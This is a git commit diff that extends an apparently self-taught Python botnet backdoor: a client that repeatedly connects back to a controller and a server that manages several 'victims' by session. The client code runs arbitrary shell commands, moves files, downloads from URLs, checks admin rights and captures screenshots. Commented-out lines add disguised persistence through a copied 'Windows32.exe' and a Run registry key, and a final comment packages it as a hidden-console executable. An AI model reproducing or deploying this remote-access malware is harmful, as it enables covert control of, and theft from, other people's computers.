b7cb1396761e876740d2043ef610f46a9987a26a
Nguyen Dang Manh Cuong <manhcuongnguyen212@gmail.com>
2025-05-18 09:31:55 +0700

    2025-05-18

--- 8.BOTNET-BACKDOOR/client.py
+++ 8.BOTNET-BACKDOOR/client.py
@@ -5,17 +5,55 @@ import subprocess
 import sys
 import json 
 import base64
+import shutil
+import time
+import requests
+import wget
+import ctypes 
+import pyautogui
+
 class Client:
     def __init__(self):
         #initialize a socket on client side
-        self.client_socket = socket(AF_INET,SOCK_STREAM)
-        self.client_socket.connect(('localhost',2222))
-        print(colored('[+] Connect to server successfully!'))
+        self.client_socket=0
+        print(colored('[+] A socket created successfully!','green'))
 
-    def changeDirectory(self,arg):
+    def retry_Connection(self,attempts,sleep_time):
+        ## try to establish connection to server after booting or launching
+        cnt = 0 
+        self.client_socket = socket(AF_INET,SOCK_STREAM)
+        while cnt < attempts: 
+            try:
+                self.client_socket.connect(('localhost',2222)) 
+                print(colored("[+] Connect to server successfully!",'green'))
+                return True 
+            except Exception as e:         
+                print("[-] A failed conection : "+str(e))
+                cnt = cnt + 1
+                time.sleep(sleep_time)
+        return False                
+    
+    def is_admin(self):
+        ## check whether a user is admin?
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+
+    def download_file_fromInternet(self,Url):
+        ## downloading file function 
+        try:
+            fileName = wget.download(url=Url)
+        except: 
+            print(colored("[-] An Error has occured during downloading the file from internet",'red'))
+            return
+        print(colored("[+] Download the file successfully!",'blue'))
+
+    def change_Directory(self,arg):
         ## change working directory
         os.chdir(arg)
         return '[+] Current directory: {}'.format(arg)
+    
     def execute_system_command(self,command):
         ## execute command on remote system in background
         return subprocess.check_output(command,shell=True)
@@ -26,6 +64,7 @@ class Client:
         self.client_socket.send(json_data.encode())
 
     def reveive_data(self): 
+        ### receive data function from server
         data = b""
         while True: 
             try:
@@ -42,8 +81,18 @@ class Client:
     def write_file(self,path,content):
         with open(path,'wb') as output:
             output.write(base64.b64decode(content.encode()))
-        return "[+] write data to file successfully!"
+            return "[+] write data to file successfully!"
+        return "[-] failed to write data to file !"
+    def start_program(self,path):
+        ## launch a program
+        subprocess.check_call(path,shell=True)
 
+    def screenshot(self):
+        save_as = 'screenshot.png'
+        screenshot = pyautogui.screenshot()
+        screenshot.save(save_as)
+        return os.getcwd()+"\\"+save_as
+    
     ## starting point
     def run(self):
         result = ""
@@ -51,23 +100,69 @@ class Client:
             command = self.reveive_data()
             try:
                 if command == 'exit':
-                    self.client_socket.close()
-                    sys.exit()
+                ## waiting commands from attackers
+                    continue
+                elif command == 'help':
+                    helptions = ["exit : exit the program",
+                                 "help: list options",
+                                 "cd path: change directory",
+                                 "download path: download file from the remote system",
+                                 "upload path: upload file to the remote system",
+                                 "get url: retrive file from internet",
+                                 "check: check whether a user is an admin or not",
+                                 "start path: launch a program",
+                                 "screenshot: take a screenshot ",
+                                 "commands: execute commands"
+                                 ]
+                    self.send_data(helptions)
                 elif command[0] == 'cd' and len(command) > 1:
-                    result = self.changeDirectory(command[1])
+                    result = self.change_Directory(command[1])
                     self.send_data(result)
                 elif command[0] == 'download':
                     content = self.read_file(command[1])
                     ## convert data in bytes to string 
                     self.send_data(content.decode())
                 elif command[0] == 'upload':
-                    result = self.write_file(command[1],command[2])
+                    result = self.write_file(command[1],command[2]) 
                     self.send_data(result)
+                elif command[0] == 'get':
+                    self.download_file_fromInternet(command[1])
+                    self.send_data('[+] get file successfully!')
+                elif command == 'check':
+                    result = "[+] A user is an Admin" if self.is_admin() else "[-] A user is not an Admin"
+                    self.send_data(result)
+                elif command[0] == 'start':
+                    self.start_program(command[1])
+                    self.send_data("[+] the program has started!")
+                elif command == 'screenshot':
+                    path = self.screenshot()
+                    result = self.read_file(path)
+                    self.send_data(result.decode())
                 else: 
                     result = self.execute_system_command(command)
                     ## before send data, convert bytes to string
                     self.send_data(result.decode())
             except Exception as e:
                 self.send_data("[-] An Error: "+ str(e))
+                continue
+
+
+
+## hide and make a persistence on remote system
+## find appData varible which is always already on window-based system
+# location = os.environ['appData'] + '\\Windows32.exe' 
+
+# if not os.path.exists(location):
+#     ## copy file to another location 
+#     shutil.copyfile(sys.argv[0],location)
+#     subprocess.run("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "'{}'" /f".format(location),shell=True)
+
 clt = Client()
-clt.run()
+## start session
+while True:
+    if clt.retry_Connection(1000,10):
+        clt.run()
+    time.sleep(15)     
+    
+
+## convert python to exe file: pyinstaller --onefile --noconsole client.py
--- 8.BOTNET-BACKDOOR/server.py
+++ 8.BOTNET-BACKDOOR/server.py
@@ -3,88 +3,159 @@ from socket import *
 import sys
 import json
 import base64
+import threading 
 
 class Server:
     def __init__(self,ip,port):
+        ## declare tagets and ip list to store connections from clients
+        self.targets = []
+        self.Ips = []
+        self.victim = 0
+        self.stop_threads = False
+
+        ## the number of client connections established
+        self.client = 0 
+
+        ## socket(ip,port) open on server side
         self.ip = ip 
         self.port = port 
         print(colored("[+] Starting the program...",'red'))
 
-            ## initialize a socket on server side
-        server_socket = socket(AF_INET,SOCK_STREAM)
-        server_socket.bind((self.ip,self.port))
-        server_socket.listen(5)
+        ## initialize a socket on server side
+        self.server_socket = socket(AF_INET,SOCK_STREAM)
+        self.server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        self.server_socket.bind((self.ip,self.port))
+        self.server_socket.listen(5)
         ## accept only 5 connections from clients
-        
-        print(colored('[+] Waiting for connecting from client','green'))
-        self.connection,Client = server_socket.accept()
+        print(colored("[+] A server listening on {}:{}".format(self.ip,self.port),'green'))
 
-        print(colored('[+] A connection established from {}'.format(Client),'green'))
+        self.thd1 = threading.Thread(target=self.server_Threads) 
+        self.thd2 = threading.Thread(target=self.center_board)
+        self.thd1.start()
+        self.thd2.start()
+
     
+    def server_Threads(self):
+        ### waiting conections from mutiple clients
+        print(colored('[+] Waiting for connecting from client','green'))
+        while True: 
+                if self.stop_threads:
+                    break
+                try:
+                    client_socket,clientIp = self.server_socket.accept()
+                    self.targets.append(client_socket)
+                    self.Ips.append(clientIp)
+                    print(colored("\n[+] A connection established from {}".format(clientIp),'green'))
+                    self.client = self.client + 1
+                except: 
+                    pass
+
+
     def execute_remotely(self,command): 
+    ###  send commands to victims and receive results
         if command[0] == 'exit':
             self.send_data(command[0])
-            self.connection.close()
-            sys.exit()
+            return
+        elif command[0] == 'help' or command[0] == 'screenshot' or command[0] == 'check':
+            self.send_data(command[0])
+            return self.receive_data()
         else:
             self.send_data(command)
-            return self.receive_data()    
+            return self.receive_data()   
+         
     def send_data(self,data):
         ## convert data to json format and continue covert to bytes
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode())
+        self.victim.send(json_data.encode())
 
     def receive_data(self):
         data = b""
         while True: 
             try:
                 ## concatenate data until enough by checking ValueError
-                data = data + self.connection.recv(1024)
+                data = data + self.victim.recv(1024)
                     ## because data in byte format so we have to convert them to str 
                 return json.loads(data.decode())
             except ValueError:
                 continue
+
 
     def read_file(self,path):
         with open(path,'rb') as output:
                 ## convert binary to bytes 
             return base64.b64encode(output.read())
 
+
     def write_file(self,path,content):
-        with open(path,'wb') as output:
-            # convert content to bytes and continue decode with base64
-            output.write(base64.b64decode(content.encode()))
-        return '[+] Write data to file succesfully!'
+        try:
+            with open(path,'wb') as output:
+                # convert content to bytes and continue decode with base64
+                output.write(base64.b64decode(content.encode()))
+            return '[+] Write data to file succesfully!'
+        except:
+            return "[-] failed to write data to file !"     
 
     ## starting the program from run function
     def run(self):
+        print(colored("Enter help to show options",'green'))
         result = ""
+        command = ""
         while True: 
             try: 
                 ## take commands 
                 command = input(">> ")
                 command = command.split(" ")
-
+                if command[0] == 'exit':
+                    break
                 ## check if upload file -> read file and send content                
                 if command[0] == 'upload'and len(command)>1:
                     content = self.read_file(command[1])
                     ## convert bytes to string before serialize using json format
                     ## because json only accepts string,list,dict...
                     command.append(content.decode())
-                
                 result = self.execute_remotely(command)
-                
+                if command[0] == 'screenshot':
+                    result = self.write_file("screenshot.png",result)
                 ## check whether command is download? and not any error during executing
                 if command[0] == 'download' and '[-]' not in result:
                     result = self.write_file(command[1],result)
-            
             except KeyboardInterrupt:
                 break
-            
             except Exception as e: 
                 print(colored('[-] An Error has occured during running the program: '+str(e),'red'))
-            print(result)
+            if 'help' in command:
+                print(colored("\t\t\t\t\tMenu options","blue"))
+                for x in result:
+                    print(colored("\t\t{}".format(x),'green'))
+            else:
+                print(result)
 
+    def center_board(self):
+    ## center of bonet network
+        while True: 
+            try:
+                print(colored("Enter: \n\ttargets --> show sessions\n\tsession i ---> starting a session with a specific client",'green'))
+                command = input(colored("Center: ","blue")).split(" ")
+                if command[0] == "targets":
+                    for x in self.Ips:
+                        print(x)
+                elif command[0] == "session" and len(command) > 1: 
+                    self.victim =  self.targets[int(command[1])]
+                    self.run()
+                elif command[0] == "exit":
+                    for x in self.targets:
+                        x.close()
+                        self.stop_threads = True 
+                    self.server_socket.close()
+                    self.thd1.join()
+                    self.thd2.join()
+            except KeyboardInterrupt:
+                break
+            except Exception as e:
+                print(e)
+                pass                
+                
 
 sv = Server('localhost',2222)
-sv.run()
+
+
